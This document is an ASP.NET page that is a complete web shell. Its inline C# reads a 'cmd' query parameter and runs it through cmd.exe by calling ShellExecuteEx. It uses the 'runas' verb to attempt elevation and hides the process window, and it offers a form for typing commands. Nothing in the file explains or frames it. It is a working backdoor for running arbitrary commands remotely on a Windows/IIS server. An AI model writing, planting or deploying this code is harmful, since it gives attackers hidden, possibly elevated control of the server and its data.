<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct SHELLEXECUTEINFO {
        public int cbSize;
        public uint fMask;
        public IntPtr hwnd;
        public string lpVerb;
        public string lpFile;
        public string lpParameters;
        public string lpDirectory;
        public int nShow;
        public IntPtr hInstApp;
        public IntPtr lpIDList;
        public string lpClass;
        public IntPtr hkeyClass;
        public uint dwHotKey;
        public IntPtr hIcon;
        public IntPtr hProcess;
    }

    [DllImport("shell32.dll", CharSet = CharSet.Unicode)]
    static extern bool ShellExecuteEx(ref SHELLEXECUTEINFO lpExecInfo);

    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (string.IsNullOrEmpty(cmd)) return;

        SHELLEXECUTEINFO sei = new SHELLEXECUTEINFO();
        sei.cbSize = Marshal.SizeOf(sei);
        sei.lpVerb = "runas";
        sei.lpFile = "cmd.exe";
        sei.lpParameters = "/c " + cmd;
        sei.nShow = 0; // SW_HIDE
        sei.fMask = 0x40; // SEE_MASK_NOCLOSEPROCESS
        bool ret = ShellExecuteEx(ref sei);
        Response.Write(ret ? "ShellExecuteEx (runas) executed." : "Failed");
    }
</script>
<html><body><h2>ShellExecuteEx (runas, hidden)</h2><form>Command: <input type="text" name="cmd" size=50 /></form></body></html>
